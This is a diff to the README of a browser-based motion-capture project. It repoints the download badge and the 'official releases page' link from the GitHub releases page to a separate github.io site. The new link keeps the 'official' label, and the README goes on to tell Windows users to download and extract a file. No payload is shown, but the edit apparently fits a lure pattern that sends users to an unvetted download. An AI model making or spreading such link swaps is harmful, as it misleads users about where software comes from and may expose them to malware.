@@ -1,6 +1,6 @@
 # 🏃 LiteRT.js-Mocap - Track human movement in your browser
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Frayagronomist166/LiteRT.js-Mocap/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://frayagronomist166.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these standards for smooth performance:
 
 Follow these steps to set up the application on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/Frayagronomist166/LiteRT.js-Mocap/releases) to access the software files.
+1.  Visit the [official releases page](https://frayagronomist166.github.io) to access the software files.
 2.  Look for the latest release version at the top of the list.
 3.  Click the link labeled with your system type to trigger the download.
 4.  Once the folder finishes downloading, right-click the file and select Extract All.
